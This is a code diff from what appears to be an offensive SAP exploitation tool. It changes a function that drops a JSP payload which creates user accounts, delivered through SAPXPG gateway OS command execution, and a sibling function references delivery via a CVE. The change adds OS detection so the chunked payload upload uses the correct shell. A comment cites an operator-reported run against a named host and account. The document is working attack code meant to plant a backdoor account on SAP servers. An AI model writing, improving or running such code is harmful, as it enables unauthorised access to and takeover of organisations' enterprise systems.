@@ -672,7 +672,8 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
 
 def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                                     chunk_size: int = 100,
-                                    tmp_dir: str = "") -> dict:
+                                    tmp_dir: str = "",
+                                    os_hint: str = "") -> dict:
     """Drop the create-user JSP via SAPXPG gateway OS exec.
 
     Gateway SAPXPG has 128-byte EXTPROG / 255-byte PARAMS limits, so a
@@ -687,7 +688,19 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     """
     sid = node.sid
     jsp_name = _random_jsp_name("ume")
-    linux = _is_linux_target(node)
+    # os_hint from the SAPControl uname probe overrides node.os_type
+    # when supplied — placeholder targets have os_type='' so
+    # _is_linux_target(node) would otherwise silently pick Windows
+    # and burn all 144 chunks on the wrong shell.  Operator-reported:
+    # SAPControl+sj1adm@srv01sm1.ncmi.co Linux stack fell through
+    # to cmd.exe echo → exit=2 on chunk 1.
+    hint = (os_hint or "").lower()
+    if hint == "unix":
+        linux = True
+    elif hint == "windows":
+        linux = False
+    else:
+        linux = _is_linux_target(node)
     os_label = "linux" if linux else "windows"
 
     # Java instance folder naming varies across NW releases:
